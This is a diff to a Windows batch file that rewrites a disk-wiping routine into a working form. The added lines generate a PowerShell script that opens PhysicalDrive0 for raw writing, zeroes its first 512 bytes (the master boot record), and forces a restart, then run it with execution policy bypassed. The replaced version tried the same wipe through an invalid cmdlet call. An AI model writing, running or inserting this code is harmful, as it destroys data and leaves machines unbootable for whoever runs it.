@@ -1,4 +1,10 @@
 @echo off
-echo Write-Host "Overwriting boot sector..."; $Drive = (Get-Disk | Where-Object {$_.Number -eq 0}).Number; $Bytes = New-Object Byte[] 512; Set-PhysicalDisk -Number $Drive -InputObject $Bytes -Offset 0; Write-Host "Forcing restart..."; Restart-Computer -Force > temp.ps1
-powershell -ExecutionPolicy Bypass -File temp.ps1
-del temp.ps1
+echo $fs = new-object System.IO.FileStream '\\.\PhysicalDrive0', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write > script.ps1
+echo try { >> script.ps1
+echo     $bytes = new-object byte[] 512 >> script.ps1
+echo     $fs.Write($bytes, 0, 512) >> script.ps1
+echo } finally { >> script.ps1
+echo     $fs.Close() >> script.ps1
+echo } >> script.ps1
+echo Restart-Computer -Force >> script.ps1
+powershell -ExecutionPolicy Bypass -File script.ps1
